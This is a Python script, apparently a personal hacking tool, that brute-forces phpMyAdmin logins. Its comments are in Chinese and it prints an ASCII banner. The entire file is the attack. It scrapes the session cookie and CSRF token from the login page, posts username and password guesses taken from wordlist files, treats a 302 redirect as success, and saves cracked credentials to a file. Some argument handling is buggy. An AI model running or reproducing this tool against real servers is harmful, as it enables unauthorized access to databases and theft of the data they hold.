#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File  : phpMyAdmin_Boom.py
# @Author: ShenHao
# @Contact : metashen@qq.com
# @Date  : 20-5-6下午7:54
# @Desc  : phpMyAdmin爆破工具


import requests
import re
import sys
import threading
import pyfiglet


def init():
    banners = pyfiglet.figlet_format('phpMyAdmin Boom')
    print(banners)
    print('\t\t\t\t\t\tPower by metaStor  v1.0\n\n')


def attack(user, password, output):
    global flag
    resp = requests.get(url)
    cookie = resp.headers['Set-Cookie']
    # 在header中
    set_session = re.findall(r'phpMyAdmin=(.*?);', cookie)
    # 在响应的源代码中
    token = re.findall(r'<input type="hidden" name="token" value="(.*?) />', resp.text)[0]
    # print(resp.text)
    # print(token)
    post_data = {"set_session": set_session, "pma_username": user, "pma_password": password, "server": "1",
                 "target": "index.php", "token": token}
    response = requests.post(url, data=post_data, allow_redirects=False)
    # flag of success
    if response.status_code == 302:
        print("\033[1;31;0m[!] Find it!  ==>\t%s %s \031" % (user, password))
        if output:
            write(output, user, password)


# 当前为单线程
def run(user, passwords, output):
    print("[!] Attack " + user)
    for line in open(passwords, 'r'):
        password = line.strip()
        attack(user, password, output)
        print('[!] Attempt\t%s - %s' % (user, password))
        # t = threading.Thread(target=attack, args=(user, password))
        # t.start()


def exception():
    print('Usage: python phpMyAdmin_Boom.py -u <url> -l <user>/<user file> -p <password file> -o <output>')
    print("""
Options:
  -h, --help       Show help message and exit
  -u=URL           Url, http://site/phpmyadmin
  -l=USERNAME      Username or path
  -p=PASSWORD      Password path
  -o=OUTPUT        Output Path (Optional)
"""
          )
    exit(-1)


def write(output, user, password):
    with open(output, 'a+') as fp:
        fp.write(user + '\t-\t' + password + '\n')


if __name__ == '__main__':
    init()
    # Usage
    args = sys.argv
    if len(args) <= 6 or '-h' in args or '--help' in args:
        exception()
    # Parse parameters
    else:
        url = str(args[2])
        users = str(args[4])  # ['root', 'mysql', 'guest', 'test']
        passwords = str(args[6])
        output = None
        # 结果是否输出到文件
        if len(args) == 8:
            output = str(args[8])
        # Password must be a file
        if '.' in passwords:
            # Username with a file
            if '.' in users:
                for line in open(users, 'r'):
                    user = line.strip()
                    run(user, passwords, output)
            # Just a username
            else:
                run(users, passwords, output)
            print("\n[!] Complete")
        else:
            exception()
